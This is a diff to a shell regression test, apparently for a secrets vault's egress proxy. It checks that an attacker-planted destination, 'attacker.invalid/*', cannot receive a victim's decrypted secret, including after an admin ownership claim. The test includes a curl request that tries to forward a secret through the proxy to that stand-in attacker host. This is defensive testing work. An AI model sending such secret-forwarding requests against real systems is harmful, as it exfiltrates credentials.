@@ -415,6 +415,61 @@ else
 fi
 
 echo
+echo "-- the CEILING the attacker widened on the old binary is inert too --"
+# The write gate refusing a NEW widening is not the same property as the exit
+# refusing the one already stored, and until this round only the second of the
+# four recorded-destination sources asked whose it was. destination_patterns did
+# not, so the capability bridge minted for the attacker's host and the proxy
+# delivered the victim's decrypted secret there with a 200.
+#
+# The upstream is unresolvable by design, so the two outcomes are told apart by
+# WHICH refusal comes back: 403 destination_not_authorized means the exit said
+# no before anything was decrypted, and a 5xx transport error means it said yes
+# and the network is all that stopped it.
+api POST /api/secrets/issue "$MANAGER_J" \
+  "{\"secret\":\"taken-by-the-manager\",\"agent_id\":\"live-skeptic\",\"dests\":[\"attacker.invalid/*\"]}" \
+  >"$WORK/issue.json"
+CAP_TOKEN=$(jsonfield "$WORK/issue.json" token)
+if [ -z "$CAP_TOKEN" ]; then
+  ok "the bridge would not even mint for the attacker's host ($STATUS): $(head -c 140 "$WORK/issue.json")"
+else
+  PROXY_CODE=$(curl -s -o "$WORK/proxy.json" -w '%{http_code}' -X POST \
+    "$BASE/proxy/attacker.invalid/collect" \
+    -H "Authorization: Capability $CAP_TOKEN" -H 'Content-Type: application/json' -d '{}')
+  if [ "$PROXY_CODE" = "403" ] && grep -q "destination_not_authorized" "$WORK/proxy.json"; then
+    ok "the proxy REFUSED AT THE EXIT before decrypting (403 destination_not_authorized): the ceiling
+        the attacker wrote is recorded on a row whose owner the migration withheld, so it authorises
+        nothing"
+  else
+    bad "the proxy did not refuse the attacker's recorded ceiling at the exit (HTTP $PROXY_CODE):
+        $(head -c 240 "$WORK/proxy.json")
+        A 5xx here means the exit AUTHORISED the delivery and only the network stopped it."
+  fi
+fi
+
+# POSITIVE CONTROL on the same route: the victim's own entry, their own ceiling.
+api POST /api/secrets/issue "$VICTIM_J" \
+  "{\"secret\":\"personal-stripe\",\"agent_id\":\"live-skeptic\",\"dests\":[\"control.invalid/*\"]}" \
+  >"$WORK/issue-ctl.json"
+CTL_TOKEN=$(jsonfield "$WORK/issue-ctl.json" token)
+if [ -z "$CTL_TOKEN" ]; then
+  bad "POSITIVE CONTROL: the rightful owner could not mint for their OWN recorded ceiling ($STATUS):
+        $(head -c 200 "$WORK/issue-ctl.json")"
+else
+  CTL_CODE=$(curl -s -o "$WORK/proxy-ctl.json" -w '%{http_code}' -X POST \
+    "$BASE/proxy/control.invalid/hook" \
+    -H "Authorization: Capability $CTL_TOKEN" -H 'Content-Type: application/json' -d '{}')
+  if [ "$CTL_CODE" = "403" ] && grep -q "destination_not_authorized" "$WORK/proxy-ctl.json"; then
+    bad "POSITIVE CONTROL FAILED: the rightful owner's own recorded ceiling was refused at the exit.
+        $(head -c 240 "$WORK/proxy-ctl.json")
+        A gate that stops the product working is not a fix."
+  else
+    ok "POSITIVE CONTROL: the owner's own ceiling was AUTHORISED at the exit and the call went to the
+        transport (HTTP $CTL_CODE on an unresolvable host, by design)"
+  fi
+fi
+
+echo
 echo "-- delivery: the planted target must not be honoured, the owner's must be --"
 REFUSAL='egress refused|not a destination recorded|may not choose where'
 
@@ -491,11 +546,34 @@ case "$STATUS" in
 esac
 
 api POST "/api/admin/vault/$SHARED_ENTRY/ownership/claim" "$ADMIN_J" '{}' >"$WORK/claim.json"
-if [ "$STATUS" = "204" ]; then
-  ok "an instance admin claimed the stranded entry (204)"
+if [ "$STATUS" = "200" ]; then
+  ok "an instance admin claimed the stranded entry (200)"
 else
   bad "the admin claim returned $STATUS: $(head -c 250 "$WORK/claim.json")"
 fi
+
+# THE CLAIM MUST NOT RE-ARM WHAT THE ATTACKER RECORDED.
+#
+# ownerRecordedDestinations counts destination_patterns and the meta-derived
+# provider hosts only while the entry's RECORDED OWNER may still direct its
+# secret. On the withheld row nobody may, so the ceiling the attacker widened on
+# the old binary is inert. Answering the ownership question is exactly what would
+# switch it back on, under the admin's authority, so the claim withdraws it in
+# the same transaction and hands it back for the admin to re-enter deliberately.
+if grep -q 'attacker.invalid' "$WORK/claim.json"; then
+  ok "the claim REPORTED the attacker's ceiling as withdrawn rather than adopting it silently"
+else
+  bad "the claim did not report withdrawing the ceiling the attacker planted on the old binary:
+        $(head -c 300 "$WORK/claim.json")"
+fi
+CEIL_AFTER=$(sq "SELECT COALESCE(destination_patterns,'') FROM vault_entries WHERE id='$SHARED_ENTRY';")
+case "$CEIL_AFTER" in
+*attacker.invalid*)
+  bad "AFTER THE REPAIR the attacker's host is STILL the entry's recorded ceiling ($CEIL_AFTER), and
+        the entry now has an owner who may direct it. That is the round-7 laundering with a helpful
+        admin UI in front of it." ;;
+*) ok "the attacker's recorded ceiling is gone from the row after the repair (now '$CEIL_AFTER')" ;;
+esac
 ADMIN_ID=$(sq "SELECT id FROM users WHERE email='live-admin@example.com';")
 REPAIRED=$(sq "SELECT secret_owner_user_id FROM vault_entries WHERE id='$SHARED_ENTRY';")
 if [ "$REPAIRED" = "$ADMIN_ID" ]; then
